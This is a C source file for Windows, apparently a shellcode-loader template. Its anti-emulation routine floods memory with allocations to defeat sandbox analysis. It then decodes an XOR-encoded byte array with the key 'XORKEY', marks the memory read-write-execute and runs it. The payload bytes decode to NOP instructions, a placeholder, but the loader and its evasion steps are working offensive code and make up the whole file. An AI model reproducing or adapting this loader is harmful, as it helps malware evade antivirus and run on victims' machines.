#include <windows.h>
#include <stdio.h>

// https://github.com/dobin/SuperMega/blob/main/data/source/antiemulation/sirallocalot.c
void antiemulation() {
    void* allocs[1000];
    DWORD result;

    for(int i=0; i<100; i++) {
        for(int n=0; n<1000; n++) {
            allocs[n] = VirtualAlloc(
                NULL, 
                200000, 
                0x3000, 
                PAGE_READWRITE
            );
            char *ptr = allocs[n];

            // write every byte of it
            for(int i=0; i<200000; i++) {
                ptr[i] = 0x23;
            }
        }

        for(int n=0; n<1000; n++) {
            if (VirtualProtect(
                allocs[n], 
                200000, 
                PAGE_EXECUTE_READWRITE, 
                &result) == 0) 
            {
                return;
            }
        }

        BOOL bSuccess;
        for(int n=0; n<1000; n++) {
            bSuccess = VirtualFree(
                            allocs[n],
                            200000,
                            0x00008000); // MEM_RELEASE
        }
    }
}



void XOR(char * ciphertext, size_t ciphertext_len, char * key, size_t key_len) {
    int myByte = 0;
    for (int idx = 0;  idx < ciphertext_len; idx++) {
        if (myByte == key_len)
        { 
            myByte = 0;
        }
        
        ciphertext[idx] = ciphertext[idx] ^ key[myByte];
        myByte++;
    }
}


int main(void)
{
	DWORD result;
	char shellcode[200] = {"\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9"
"\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9"
"\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9"
"\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9"
"\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9"
"\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9"
"\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9"
"\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9"
"\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF"};
	char xorkey[] = "XORKEY";


    antiemulation();
	
	// Allocate memory for the shellcode RW
    char *dest = VirtualAlloc(NULL, sizeof(shellcode), 0x3000, PAGE_READWRITE);
	if (dest == NULL) {
		return 1;
	}

	// Copy the shellcode to the allocated memory
	memcpy(dest, shellcode, sizeof(shellcode));

	// Decode the shellcode
	XOR((char *) dest, sizeof(shellcode), xorkey, strlen(xorkey));

	// Change memory protection to RX
	if (VirtualProtect(dest, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &result) == 0) {
		return 2;
	}

    // Execute *dest
    (*(void(*)())(dest))();
	
	return 0;
}
